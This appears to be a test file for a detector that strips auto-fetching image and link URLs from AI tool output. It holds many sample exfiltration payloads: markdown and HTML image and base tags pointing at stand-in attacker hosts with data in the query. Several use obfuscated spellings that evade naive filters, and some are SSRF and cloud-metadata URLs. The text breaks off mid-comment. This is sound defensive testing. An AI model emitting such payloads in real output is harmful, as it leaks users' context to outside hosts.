import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { expect, test } from "bun:test";
import { containerStrippedView, detectExfil } from "./exfil";
import { detectEgress } from "./egress";
import { runDetectors } from "./index";
import { applyRedaction } from "../redact";
import { mergeSecurityConfig } from "../config";
import { prepareOutputForPersistence, type GuardResult } from "../guard";
import { validateOutputForTransport } from "../output-validation";
import type { EvalCase } from "../eval/harness";

const FIXTURES = path.join(
  path.dirname(fileURLToPath(import.meta.url)),
  "..",
  "..",
  "..",
  "fixtures",
);

async function loadCases(corpus: string): Promise<EvalCase[]> {
  const file = path.join(FIXTURES, corpus, "cases.json");
  return (JSON.parse(await readFile(file, "utf8")).cases as EvalCase[]);
}

// AC2.1 — every enumerated EchoLeak markdown/reference/HTML image+link vector is
// flagged egress; benign controls are not (deny-by-default, empty allowlist).
test("AC2.1/AC2.4: every enumerated exfil vector is flagged, benign controls are not", async () => {
  const cases = await loadCases("exfil");
  for (const c of cases) {
    const matches = runDetectors(c.input, mergeSecurityConfig({}));
    const fired = matches.some((m) => m.category === "egress");
    expect(`${c.id}:${fired}`).toBe(`${c.id}:${c.expected === "positive"}`);
  }
});

// AC2.1 — the markdown/link URL span is redactable so applyRedaction strips it.
test("AC2.1: markdown-image and reference-link URL spans are redactable", () => {
  const content = "See ![x](https://evil.example.com/leak?d=SECRET) now.";
  const matches = detectExfil(content, []);
  expect(matches.length).toBeGreaterThan(0);
  expect(matches[0]?.mask).toBe("url");
  const redacted = applyRedaction(content, matches);
  expect(redacted).not.toContain("https://evil.example.com/leak?d=SECRET");
  expect(redacted).toContain("[REDACTED:url]");
});

test("AC2.1: reference-style definition URL is redactable and neutralizes the use", () => {
  const content = "Look ![c][r]\n\n[r]: https://attacker.example.net/pixel.png";
  const matches = detectExfil(content, []);
  const ref = matches.find((m) => m.policyId === "egress.reference-link-exfil");
  expect(ref).toBeDefined();
  const redacted = applyRedaction(content, matches);
  expect(redacted).not.toContain("attacker.example.net/pixel.png");
});

// AC2.2 — deny-by-default against a non-empty allowlist, proximity-independent.
test("AC2.2: non-allowlisted markdown host flagged; allowlisted host not (deny-by-default)", () => {
  const content = "![img](https://cdn.trusted.example.com/a.png) and ![bad](https://evil.example.io/b.png)";
  const withAllow = detectExfil(content, ["trusted.example.com"]);
  const hosts = withAllow.map((m) => m.value);
  expect(hosts.some((v) => v.includes("evil.example.io"))).toBe(true);
  expect(hosts.some((v) => v.includes("trusted.example.com"))).toBe(false);
});

// AC2.2 — the egress allowlist rule flags a plain non-allowlisted URL regardless
// of send-verb proximity.
test("AC2.2: egress.non-allowlisted-domain fires without a send verb when allowlist set", () => {
  const content = "The homepage is https://random.example.org/page.";
  const flagged = detectEgress(content, ["corp.example.com"]);
  expect(flagged.some((m) => m.policyId === "egress.non-allowlisted-domain")).toBe(true);
  const allowed = detectEgress("Docs at https://docs.corp.example.com/x.", ["corp.example.com"]);
  expect(allowed.some((m) => m.policyId === "egress.non-allowlisted-domain")).toBe(false);
});

// AC2.3 — empty allowlist preserves today's send-verb proximity behavior exactly.
test("AC2.3: empty allowlist keeps send-verb proximity behavior (no non-allowlisted-domain)", () => {
  const withVerb = detectEgress("Please POST it to https://evil.example.com/c", []);
  expect(withVerb.some((m) => m.policyId === "egress.external-url-send")).toBe(true);
  expect(withVerb.some((m) => m.policyId === "egress.non-allowlisted-domain")).toBe(false);

  const noVerb = detectEgress("Visit https://docs.example.org/guide for details.", []);
  expect(noVerb.length).toBe(0);
});

// AC2.4 — SSRF / private-IP / metadata targets are flagged; benign public not.
test("AC2.4: SSRF/private-IP/metadata hosts flagged as egress.ssrf-metadata", () => {
  const vectors = [
    "curl http://169.254.169.254/latest/meta-data/",
    "fetch http://metadata.google.internal/computeMetadata/v1/",
    "connect to 10.0.0.5 internally",
    "http://127.0.0.1:8080/admin",
    "http://192.168.1.1/",
    "http://172.16.5.4/",
  ];
  for (const v of vectors) {
    const m = detectEgress(v, []);
    expect(`${v}:${m.some((x) => x.policyId === "egress.ssrf-metadata")}`).toBe(`${v}:true`);
  }
  const benign = detectEgress("Our API is at https://api.example.com/v1/", []);
  expect(benign.some((m) => m.policyId === "egress.ssrf-metadata")).toBe(false);
});

test("HTML entity encoded image URLs are treated as auto-fetch exfiltration", () => {
  const content = '<img src="https&#58;//evil.example/pixel?d=context">';
  const matches = detectExfil(content, []);

  expect(matches.some((match) => match.policyId === "egress.html-image-exfil")).toBe(true);
  const redacted = applyRedaction(content, matches);
  expect(redacted).not.toContain("evil.example/pixel");
});

// T24R#F-002: an HTML tokenizer consumes an UNBOUNDED digit run and then range
// checks the code point, so a zero-padded reference decodes to `:` and fetches.
// A decoder bounded by digit count sees only a prefix and classifies nothing.
test("zero-padded decimal and hexadecimal character references are decoded like a renderer decodes them", () => {
  const host = "attacker.invalid";
  const vectors = [
    `<img src="https&#00000058;//${host}/pixel?d=context">`,
    `<img src="https&#0000000058;//${host}/pixel?d=context">`,
    `<img src="https&#x000003a;//${host}/pixel?d=context">`,
    `<img src="https&#X00003A;//${host}/pixel?d=context">`,
  ];

  for (const content of vectors) {
    const matches = detectExfil(content, []);
    expect(`${content}:${matches.length > 0}`).toBe(`${content}:true`);
    expect(applyRedaction(content, matches)).not.toContain(host);
  }
});

// The WHATWG URL parser removes ASCII tab, LF and CR from the URL and strips
// leading C0-or-space, so each of these is the same request as the plain URL.
test("whitespace and control characters inside or before the URL do not hide the host", () => {
  const host = "attacker.invalid";
  const tail = `//${host}/pixel?d=context`;
  const vectors = [
    `<img src="ht&#9;tps:${tail}">`,
    `<img src="ht\ttps:${tail}">`,
    `<img src="ht\ntps:${tail}">`,
    `<img src="ht\rtps:${tail}">`,
    `<img src=" https:${tail}">`,
    `<img src="\nhttps:${tail}">`,
    `<img src="&#9;https:${tail}">`,
    `![x](https&#00000058;${tail})`,
  ];

  for (const content of vectors) {
    const matches = detectExfil(content, []);
    expect(`${content}:${matches.length > 0}`).toBe(`${content}:true`);
    // masking lands on the RAW span, so the host leaves the original bytes
    expect(applyRedaction(content, matches)).not.toContain(host);
  }
});

// The renderer-grammar decoder must not turn benign text into an egress finding.
test("the renderer-grammar decoder leaves benign auto-fetch controls unflagged", () => {
  for (const content of [
    "[public documentation](https://docs.example.org/guide)",
    "See https://docs.example.org/guide for details.",
    `<img src="/assets/logo.png">`,
    `<img src="data:image/png;base64,iVBORw0KGgo=">`,
    `<img src="&#0;/assets/logo.png">`,
    `<img srcset="attacker.invalid/pixel 1x">`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }
});

test("every srcset candidate is checked while ordinary public links stay unchanged", () => {
  const content =
    '<img srcset="https://evil.example/pixel?d=context 1x, https://trusted.example/pixel 2x">';
  const matches = detectExfil(content, ["trusted.example"]);

  expect(matches.some((match) => match.value.includes("evil.example"))).toBe(true);
  expect(matches.some((match) => match.value.includes("trusted.example"))).toBe(false);
  const redacted = applyRedaction(content, matches);
  expect(redacted).not.toContain("evil.example/pixel");
  expect(detectExfil("Read https://public.example/docs", []).length).toBe(0);
});

// ---------------------------------------------------------------------------
// T40 / T24R2#F-001 — the five renderer-equivalent classes the authority
// PATTERN could not reach. Each class gets its own regression; the destination
// is now RESOLVED with the platform URL parser against a synthetic base, so a
// spelling the WHATWG parser accepts is a spelling this detector accepts.
// Written before the fix; each failed on the pre-fix code.
// ---------------------------------------------------------------------------

const ATTACKER = "attacker.invalid";
// Written as code units so the source carries no ambiguous escape runs.
const BS = String.fromCharCode(92); // reverse solidus
const TAB = String.fromCharCode(9);

function expectFlaggedAndMasked(vectors: string[]): void {
  for (const content of vectors) {
    const matches = detectExfil(content, []);
    expect(`${content}:${matches.length > 0}`).toBe(`${content}:true`);
    // Masking stays on the RAW span, so the host leaves the original bytes.
    expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
  }
}

// Class 1 — the URL parser's relative-slash and special-authority-ignore-slashes
// states treat `\` exactly as `/` for a special scheme, so every one of these is
// protocol-relative and fetches the attacker host from any base.
test("backslash spellings of the authority are resolved, not pattern-matched", () => {
  expectFlaggedAndMasked([
    `<img src="${BS}${BS}${ATTACKER}/p?x=ctx">`,
    `<img src="https:${BS}${BS}${ATTACKER}/p?x=ctx">`,
    `<img src="https:/${BS}${ATTACKER}/p?x=ctx">`,
    `<img src="/${BS}${ATTACKER}/p?x=ctx">`,
    `<img src="&#92;&#92;${ATTACKER}/p?x=ctx">`,
    `<img src="&#x5c;&#x5c;${ATTACKER}/p?x=ctx">`,
    // `&bsol;` is the HTML5 named reference for the reverse solidus. It was not
    // in the reviewer's matrix and was a live bypass of this same class until the
    // named table gained it: a decoder that knows `&#92;` but not `&bsol;` is
    // still enumerating spellings.
    `<img src="&bsol;&bsol;${ATTACKER}/p?x=ctx">`,
    `<img srcset="${BS}${BS}${ATTACKER}/p?x=ctx 1x">`,
    `![x](${BS}${BS}${ATTACKER}/p?x=ctx)`,
  ]);
});

// Class 2 — the parser skips an UNBOUNDED run of `/` and `\` after the scheme,
// so the byte after `//` is not required to start the host.
test("extra slash runs after the scheme do not hide the host", () => {
  expectFlaggedAndMasked([
    `<img src="https:///${ATTACKER}/p?x=ctx">`,
    `<img src="https:////${ATTACKER}/p?x=ctx">`,
    `<img src="///${ATTACKER}/p?x=ctx">`,
    `<img src="https:/${BS}/${BS}${ATTACKER}/p?x=ctx">`,
  ]);
});

// Class 3 — `&Tab;` and `&NewLine;` are HTML5 named references whose decoded
// character (U+0009 / U+000A) the URL parser then REMOVES, exactly like the
// numeric `&#9;` form. A table without them leaves the scheme looking broken.
test("the HTML5 named references for tab and newline are decoded like a renderer decodes them", () => {
  expectFlaggedAndMasked([
    `<img src="ht&Tab;tps://${ATTACKER}/p?x=ctx">`,
    `<img src="ht&NewLine;tps://${ATTACKER}/p?x=ctx">`,
    `<img src="https&Tab;://${ATTACKER}/p?x=ctx">`,
    `<img src="&Tab;https://${ATTACKER}/p?x=ctx">`,
    `<img src="&NewLine;https://${ATTACKER}/p?x=ctx">`,
  ]);
});

// Class 4 — the HTML parser's "in body" insertion mode rewrites an `image` start
// tag to `img` and reprocesses it, so `<image src>` fetches identically.
test("the image start tag is the img alias the HTML parser makes it", () => {
  expectFlaggedAndMasked([
    `<image src="https://${ATTACKER}/p?x=ctx">`,
    `<image src="https&#58;//${ATTACKER}/p?x=ctx">`,
    `<image srcset="/local.png 1x, https://${ATTACKER}/p?x=ctx 2x">`,
    `<IMAGE SRC="https://${ATTACKER}/p?x=ctx">`,
  ]);
});

// Class 5 — a CommonMark pointy-bracket destination may contain spaces and tabs.
// The extraction regexes truncated it at the first whitespace, so the classifier
// never saw the vector at all: fixing the classifier alone cannot close this.
test("angle-bracket destinations reach the classifier without being truncated", () => {
  expectFlaggedAndMasked([
    `![x](<ht${TAB}tps://${ATTACKER}/p?x=ctx>)`,
    `![x](< https://${ATTACKER}/p?x=ctx>)`,
    `![x](<https://${ATTACKER}/p?x=ctx>)`,
    `![x][r]\n\n[r]: <ht${TAB}tps://${ATTACKER}/p?x=ctx>`,
    `![x][r]\n\n[r]: < https://${ATTACKER}/p?x=ctx>`,
  ]);
});

// The floor is the reviewer's four controls; these are the additions the
// dispatch asks for. A relative path must never be read as an authority, and an
// authority must never be read as a relative path.
test("resolution against a synthetic base leaves benign destinations unflagged", () => {
  for (const content of [
    // an ordinary public Markdown link whose path contains a backslash
    `[public documentation](https://docs.example.org/a${BS}b/guide)`,
    // a relative image whose path contains a backslash
    `<img src="/assets/a${BS}b/logo.png">`,
    `<img src="assets/a${BS}b/logo.png">`,
    // a legitimate multi-candidate srcset, all relative
    `<img srcset="/a/logo.png 1x, /a/logo@2x.png 2x, /a/logo@3x.png 3x">`,
    // the new angle-bracket extraction must not invent findings
    `![logo](</assets/logo.png>)`,
    `![logo](<./assets/logo.png>)`,
    `![logo][r]\n\n[r]: </assets/logo.png>`,
    // the new <image> alias must not flag a same-origin destination
    `<image src="/assets/logo.png">`,
    `<image srcset="/a/logo.png 1x, /a/logo@2x.png 2x">`,
    // scheme-less, fragment-only and query-only destinations
    `<img src="docs.example.org/pixel.png">`,
    `![anchor](#section)`,
    `![query](?v=2)`,
    `<img src="mailto:ping@host.example">`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }

  // A legitimate multi-candidate srcset entirely on an allowlisted host.
  const trusted =
    '<img srcset="https://cdn.trusted.example/a.png 1x, https://cdn.trusted.example/b.png 2x">';
  expect(detectExfil(trusted, ["trusted.example"]).length).toBe(0);
});

// The detector is not where the floor is proved. These two drive the SAME
// functions the MCP transport and the durable sinks call, so a class closed in
// `detectExfil` is shown closed at the public boundaries too.
const CLASS_VECTORS: Array<{ name: string; note: string }> = [
  { name: "backslash authority", note: `<img src="${BS}${BS}${ATTACKER}/p?x=ctx">` },
  { name: "extra slash run", note: `<img src="https:///${ATTACKER}/p?x=ctx">` },
  { name: "named tab reference", note: `<img src="ht&Tab;tps://${ATTACKER}/p?x=ctx">` },
  { name: "image tag alias", note: `<image src="https://${ATTACKER}/p?x=ctx">` },
  { name: "angle-bracket destination", note: `![x](<ht${TAB}tps://${ATTACKER}/p?x=ctx>)` },
];

const GUARD_PASS: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

test("the persistence materializer never writes an auto-fetch host for any class", () => {
  for (const vector of CLASS_VECTORS) {
    const serialized = JSON.stringify({ note: vector.note });
    const output = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${vector.name}:${output.allowed}`).toBe(`${vector.name}:true`);
    if (!output.allowed) continue;
    expect(`${vector.name}:${output.content.includes(ATTACKER)}`).toBe(
      `${vector.name}:false`,
    );
    expect(`${vector.name}:${output.content === serialized}`).toBe(
      `${vector.name}:false`,
    );
  }
  // A clean payload stays byte-identical through the same materializer.
  const clean = JSON.stringify({ note: '<img src="/assets/logo.png">' });
  expect(prepareOutputForPersistence(GUARD_PASS, clean)).toEqual({
    allowed: true,
    content: clean,
    redaction: { state: "none", reasons: [] },
    bytesPreserved: true,
  });
});

// ---------------------------------------------------------------------------
// T52 / T42#F-001..F-003 + F-006 — the layer ABOVE the classifier. T40 made
// classification resolve instead of recognize, and the next round found that the
// destinations never reached it: the attribute scan was a character class, not a
// tokenizer. These regressions pin the extractor, the base-scheme assumption
// inside the classifier, and the one document-level element (`<base href>`) that
// can falsify "relative ⇒ same origin". Written before the fix; each failed on
// the pre-fix code.
// ---------------------------------------------------------------------------

// Defect 1 — the HTML tokenizer does not end a tag at a `>` inside a quoted
// attribute value, and an attribute VALUE is not an attribute NAME position. The
// forms below are the tokenizer's own states between `<img` and the closing `>`,
// enumerated from HTML Standard §13.2.5, not a list of tricks.
test("attribute scanning follows the tokenizer, so a quoted > or a decoy src= cannot hide a destination", () => {
  const U = `https://${ATTACKER}/p?x=ctx`;
  expectFlaggedAndMasked([
    // `>` inside an earlier quoted value — the element renders and fetches
    `<img alt="a>b" src="${U}">`,
    `<img alt='a>b' src='${U}'>`,
    `<image alt="a>b" src="${U}">`,
    `<img alt="a>b" srcset="${U} 1x">`,
    `<image alt="a>b" srcset="${U} 1x">`,
    // a decoy attribute NAME written inside an earlier value
    `<img alt="src=/safe" src="${U}">`,
    `<img alt="srcset=/safe" srcset="${U} 1x">`,
    `<img data-note="see src=/a.png for details" src="${U}">`,
    `<img data-note="src=/a.png" alt="a>b" src="${U}">`,
    // the same tag spread over lines
    `<img\n  alt="a>b"\n  src="${U}">`,
    // unquoted value, whitespace around `=`, solidus between attributes, case
    `<img alt=a src=${U}>`,
    `<img alt="a>b" SRC = "${U}">`,
    `<img/alt="a>b"/src="${U}"/>`,
    `<IMG ALT="a>b" SRCSET="${U} 2x">`,
    // a valueless attribute before the destination
    `<img hidden alt="a>b" src="${U}">`,
    // a duplicate `src`: a tree builder keeps the first, we classify both
    `<img src="/safe.png" src="${U}">`,
    // `=` as the first character of an attribute name
    `<img ="x" alt="a>b" src="${U}">`,
    // EOF inside the tag: our input is a fragment, the renderer may hold the
    // terminator we do not
    `<img alt="a>b" src="${U}"`,
  ]);
});

// Defect 2 — WHATWG resolution of a `scheme:`-with-no-slashes destination depends
// on the BASE's scheme, and both synthetic bases were `https:`. These are
// relative only in an `https:` document; in a `file:`, `vscode-webview:` or
// custom `app:` document — where MCP clients actually render — they fetch the
// attacker host.
test("a scheme-with-no-slashes destination is judged independently of the base scheme", () => {
  expectFlaggedAndMasked([
    `<img src="https:${ATTACKER}/p?x=ctx">`,
    `<img src="https:/${ATTACKER}/p?x=ctx">`,
    `<img src="HTTPS:${ATTACKER}/p?x=ctx">`,
    `<img src="HtTpS:${ATTACKER}/p?x=ctx">`,
    `<img src="https&colon;${ATTACKER}/p?x=ctx">`,
    `<img srcset="https:${ATTACKER}/p?x=ctx 1x">`,
    `![x](https:${ATTACKER}/p?x=ctx)`,
    `![x][r]\n\n[r]: https:${ATTACKER}/p?x=ctx`,
  ]);
});

// Defect 3 — a CommonMark BARE destination may legally contain `>`; the negated
// class cut there and left the tail outside the mask.
test("a bare CommonMark destination containing > is masked whole", () => {
  for (const content of [
    `![x](https://${ATTACKER}/a>b)`,
    `![x][r]\n\n[r]: https://${ATTACKER}/a>b`,
  ]) {
    const matches = detectExfil(content, []);
    expect(`${content}:${matches.length > 0}`).toBe(`${content}:true`);
    const redacted = applyRedaction(content, matches);
    expect(redacted).not.toContain(ATTACKER);
    // the `>`-tail is inside the mask, not left behind next to it
    expect(`${content}:${redacted.includes(">b")}`).toBe(`${content}:false`);
  }
});

// Defect 4 — `<base href>` fetches nothing and re-points EVERY relative URL in
// the document, so it falsifies the load-bearing half of the two-base rule.
// Masking it restores that rule for the rendered text.
test("a base element carrying its own authority is a document-level egress finding", () => {
  for (const content of [
    `<base href="https://${ATTACKER}/"><img src="/p?x=ctx">`,
    `<base href="//${ATTACKER}/">`,
    `<base href="https:${ATTACKER}/">`,
    `<BASE HREF='https://${ATTACKER}/'>`,
    `<base target="_blank" href="https://${ATTACKER}/">`,
    `<base href="${BS}${BS}${ATTACKER}/">`,
  ]) {
    const matches = detectExfil(content, []);
    expect(
      `${content}:${matches.some((m) => m.policyId === "egress.html-base-href-exfil")}`,
    ).toBe(`${content}:true`);
    expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
  }

  // A base that re-points nowhere, and an allowlisted one, are not findings.
  for (const content of [
    `<base href="/docs/"><img src="/p.png">`,
    `<base href="./docs/">`,
    `<base target="_blank">`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }
  expect(
    detectExfil(`<base href="https://cdn.trusted.example/">`, ["trusted.example"])
      .length,
  ).toBe(0);
});

// The other direction of the same fix: a tokenizer-faithful scan must not invent
// findings out of text that only LOOKS like markup, and must keep every benign
// destination shape unflagged.
test("tokenizer-faithful attribute scanning adds no false positives", () => {
  for (const content of [
    // an element written INSIDE another element's quoted value is text, not an
    // element — a renderer never fetches it
    `<img alt="<img src=https://${ATTACKER}/p>" src="/assets/logo.png">`,
    `<img alt="<base href=https://${ATTACKER}/>" src="/assets/logo.png">`,
    `<img alt="<image srcset=https://${ATTACKER}/p 1x>" src="/assets/logo.png">`,
    // ordinary prose and markup shapes around a relative destination
    `<img alt="the src attribute" src="/assets/logo.png">`,
    `<img data-note="a > b and src=/x" src="/assets/logo.png">`,
    `<img/src="/assets/logo.png"/>`,
    `<img src=/assets/logo.png>`,
    `<img hidden src = '/assets/logo.png'>`,
    `<img src="/a.png" src="/b.png">`,
    `<img ="x" src="/assets/logo.png">`,
    `<image alt="a>b" src="/assets/logo.png">`,
    `<img alt="a>b" srcset="/a.png 1x, /b.png 2x">`,
    // not the img element at all
    `<imgur src="https://${ATTACKER}/p">`,
    `<based href="https://${ATTACKER}/">`,
    // markdown that only looks like a destination
    `Use the \`src\` attribute; see a > b for why.`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }
});

// The classes above, driven through the SAME functions the MCP transport and the
// durable sinks call — the detector is not where the floor is proved.
const T52_CLASS_VECTORS: Array<{ name: string; note: string; policyId: string }> = [
  {
    name: "quoted > in an earlier attribute",
    note: `<img alt="a>b" src="https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "decoy src= in an earlier attribute",
    note: `<img alt="src=/safe" src="https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "srcset behind a quoted >",
    note: `<img alt="a>b" srcset="https://${ATTACKER}/p?x=ctx 1x">`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "image alias behind a quoted >",
    note: `<image alt="a>b" src="https://${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "scheme with no slashes",
    note: `<img src="https:${ATTACKER}/p?x=ctx">`,
    policyId: "egress.html-image-exfil",
  },
  {
    name: "base element re-point",
    note: `<base href="https://${ATTACKER}/"><img src="/p?x=ctx">`,
    policyId: "egress.html-base-href-exfil",
  },
  {
    name: "bare destination containing >",
    note: `![x](https://${ATTACKER}/a>b)`,
    policyId: "egress.markdown-image-exfil",
  },
];

test("the persistence materializer never writes an auto-fetch host for the extraction classes", () => {
  for (const vector of T52_CLASS_VECTORS) {
    const serialized = JSON.stringify({ note: vector.note });
    const output = prepareOutputForPersistence(GUARD_PASS, serialized);
    expect(`${vector.name}:${output.allowed}`).toBe(`${vector.name}:true`);
    if (!output.allowed) continue;
    expect(`${vector.name}:${output.content.includes(ATTACKER)}`).toBe(
      `${vector.name}:false`,
    );
    expect(`${vector.name}:${output.content === serialized}`).toBe(
      `${vector.name}:false`,
    );
  }
});

test("the transport validator reports every extraction class as redacted with the host gone", () => {
  for (const vector of T52_CLASS_VECTORS) {
    const result = validateOutputForTransport({
      format: "json",
      value: { note: vector.note },
    });
    expect(`${vector.name}:${result.ok}`).toBe(`${vector.name}:true`);
    if (!result.ok) continue;
    expect(`${vector.name}:${result.text.includes(ATTACKER)}`).toBe(
      `${vector.name}:false`,
    );
    expect(`${vector.name}:${result.redaction.state}`).toBe(
      `${vector.name}:redacted`,
    );
    expect(`${vector.name}:${result.redaction.reasons.includes(vector.policyId)}`).toBe(
      `${vector.name}:true`,
    );
  }
});

test("the transport validator reports every class as redacted with the host gone", () => {
  for (const vector of CLASS_VECTORS) {
    const result = validateOutputForTransport({
      format: "json",
      value: { note: vector.note },
    });
    expect(`${vector.name}:${result.ok}`).toBe(`${vector.name}:true`);
    if (!result.ok) continue;
    expect(`${vector.name}:${result.text.includes(ATTACKER)}`).toBe(
      `${vector.name}:false`,
    );
    expect(`${vector.name}:${result.redaction.state}`).toBe(
      `${vector.name}:redacted`,
    );
    expect(result.redaction.reasons).toContain(
      vector.note.startsWith("!")
        ? "egress.markdown-image-exfil"
        : "egress.html-image-exfil",
    );
  }
  // An ordinary public Markdown link is still not a finding at the transport.
  const benign = validateOutputForTransport({
    format: "json",
    value: { note: "[public documentation](https://docs.example.org/guide)" },
  });
  expect(benign.ok).toBe(true);
  if (!benign.ok) return;
  expect(benign.redaction.state).toBe("none");
});

// ---------------------------------------------------------------------------
// T63 / T53#F-001..F-004 — closing the fifth review's four findings. Three are
// documentation-only (F-002, F-003, F-004): the behaviour they describe is
// unchanged, and these regressions pin the code fact each corrected sentence now
// states.
//
// F-001's DISCLOSURE half stands (the whole-document blast radius, the separate
// BASE_REMEDIATION string, the corrected asymmetry comment). Its BEHAVIOUR half —
// suppressing a `<base href>` finding inside a span two regexes showed was a
// closed HTML comment or a closed fenced code block — was reverted in T67 after
// T62#F-001 measured it as a live bypass of the mandatory floor: six payloads
// produced no finding at all, four of them confirmed releasing the attacker host
// at `dispatchCallTool`, `prepareOutputForPersistence`,
// `validateOutputForTransport` and `redactToolOutput` with
// `redaction.state:"none"` and an empty `reasons` array.
//
// The three tests that pinned the suppression are INVERTED below rather than
// deleted: they now assert the suppression is gone. The six shapes from T62#F-001
// follow them, so the specific constructs that defeated the regexes stay pinned.
// ---------------------------------------------------------------------------

test("T62#F-001: a base element inside a closed HTML comment is a finding again (suppression reverted)", () => {
  const content = `<!-- <base href="https://${ATTACKER}/docs/"> -->`;
  const matches = detectExfil(content, []);
  expect(matches.some((match) => match.policyId === "egress.html-base-href-exfil")).toBe(
    true,
  );
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
});

test("T62#F-001: a base element inside a closed backtick-fenced code block is a finding again (suppression reverted)", () => {
  const content =
    "Set the document base:\n\n```html\n" +
    `<base href="https://${ATTACKER}/docs/">\n` +
    "```\n";
  const matches = detectExfil(content, []);
  expect(matches.some((match) => match.policyId === "egress.html-base-href-exfil")).toBe(
    true,
  );
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
});

test("T62#F-001: a base element inside a closed tilde-fenced code block is a finding again (suppression reverted)", () => {
  const content = "~~~\n" + `<base href="https://${ATTACKER}/docs/">\n` + "~~~\n";
  const matches = detectExfil(content, []);
  expect(matches.some((match) => match.policyId === "egress.html-base-href-exfil")).toBe(
    true,
  );
  expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
});

// The six shapes T62#F-001 used. Four (x01, x02, x03, x07) were confirmed leaking
// the attacker host at all four public boundaries; x05 and x06 are decided by the
// CommonMark model this file's header commits to. Each defeats a *different* half
// of the reverted rule, so all six stay pinned: three abrupt/bang comment
// terminators the `-->`-only regex does not know, and three shapes where fence
// spans and comment spans computed independently of one another pair delimiters
// no renderer pairs.
test("T62#F-001: every shape that defeated the inert-span regexes is a finding, and none releases the host", () => {
  const shapes: Array<[string, string]> = [
    ["x01.abruptEmptyComment", `<!--><base href="https://${ATTACKER}/x/"><img src="p.png">-->`],
    ["x02.abruptDashComment", `<!---><base href="https://${ATTACKER}/x/"><img src="p.png">-->`],
    [
      "x03.commentEndBang",
      `<!-- note --!><base href="https://${ATTACKER}/x/"><img src="p.png"> -->`,
    ],
    [
      "x05.commentDelimitersQuotedInFences",
      "```\n<!--\n```\n\n" + `<base href="https://${ATTACKER}/x/">` + "\n\n```\n-->\n```\n",
    ],
    [
      "x06.commentDelimitersInCodeSpans",
      "A comment starts with `<!--`.\n\n" +
        `<base href="https://${ATTACKER}/x/">` +
        "\n\nand ends with `-->`.\n",
    ],
    [
      "x07.fenceMarkersQuotedInsideAComment",
      "<!--\n```\n-->\n\n" + `<base href="https://${ATTACKER}/x/">` + "\n\n```\n",
    ],
  ];
  for (const [id, content] of shapes) {
    const matches = detectExfil(content, []);
    const flagged = matches.some(
      (match) => match.policyId === "egress.html-base-href-exfil",
    );
    expect(`${id}:${flagged}`).toBe(`${id}:true`);
    expect(`${id}:${applyRedaction(content, matches).includes(ATTACKER)}`).toBe(
      `${id}:false`,
    );
  }
});

test("T53#F-001: an unterminated comment or fence still gets its base element classified", () => {
  for (const content of [
    `<!-- <base href="https://${ATTACKER}/docs/">`,
    "```html\n" + `<base href="https://${ATTACKER}/docs/">\n`,
  ]) {
    const matches = detectExfil(content, []);
    expect(
      `${content}:${matches.some((match) => match.policyId === "egress.html-base-href-exfil")}`,
    ).toBe(`${content}:true`);
    expect(applyRedaction(content, matches)).not.toContain(ATTACKER);
  }
});

test("T53#F-001: an img element inside a comment or fence is still flagged (unchanged, cheaper class)", () => {
  for (const content of [
    `<!-- <img src="https://${ATTACKER}/p"> -->`,
    "```html\n" + `<img src="https://${ATTACKER}/p">\n` + "```\n",
  ]) {
    expect(detectExfil(content, []).length).toBeGreaterThan(0);
  }
});

test("T53#F-001: a base element outside any comment or fence is still flagged even when the document also contains one", () => {
  const content =
    "```html\n<p>example</p>\n```\n" + `<base href="https://${ATTACKER}/docs/">`;
  const matches = detectExfil(content, []);
  expect(matches.some((match) => match.policyId === "egress.html-base-href-exfil")).toBe(
    true,
  );
});

test("T53#F-001: the base finding's remediation discloses the whole-document blast radius, distinct from an image finding's", () => {
  const baseMatches = detectExfil(`<base href="https://${ATTACKER}/">`, []);
  const imgMatches = detectExfil(`<img src="https://${ATTACKER}/p">`, []);
  expect(baseMatches[0]?.remediation).toContain("whole document");
  expect(baseMatches[0]?.remediation).not.toBe(imgMatches[0]?.remediation);
});

// T53#F-002 — the sufficiency argument's actual load-bearing fact: resolvedHost
// discards any resolution whose protocol is not http(s), so a destination that
// only ever resolves to a file:/ws:/wss:/ftp: URL under either synthetic base
// pair is not a finding regardless of what a third base scheme could add.
test("T53#F-002: a destination resolving only to a non-http(s) protocol under either base pair is not a finding", () => {
  for (const content of [
    `<img src="file:///etc/passwd">`,
    `<img src="file://${ATTACKER}/share/x">`,
    `<img src="ws://${ATTACKER}/socket">`,
    `<img src="wss://${ATTACKER}/socket">`,
    `<img src="ftp://${ATTACKER}/x">`,
  ]) {
    expect(`${content}:${detectExfil(content, []).length}`).toBe(`${content}:0`);
  }
});

// T53#F-003 — the conservative half of the same EOF rule that classifies an
// unterminated tag eagerly: an unterminated quoted value swallows the rest of the
// fragment, matching a conformant tokenizer.
test("T53#F-003: an unterminated quoted value swallows the rest of the fragment, matching a conformant tokenizer", () => {
  const content = `<img alt="x <img src="https://${ATTACKER}/p">`;
  expect(detectExfil(content, []).length).toBe(0);
});

// ---------------------------------------------------------------------------
// T46 / T42#F-006 — the render-triggered surfaces the floor did not cover.
//
// The enumeration is re-derived in `T46-spec.md` from the HTML Standard's
// element index, the CSS <url> consumers and the SVG external-reference
// elements, and measured in `T46-surfaces.ts`: 33 fetching sites reached the MCP
// client with `redaction.state:"none"` and durable sinks byte-identical.
//
// The decision is per surface, not per list. The ones covered below share one
// property: they are CONTENT a document carries only when it deliberately
// embeds something, so a benign carrier is an embed — the same order of cost as
// the `<img src>` badge the floor already masks. The ones deliberately left open
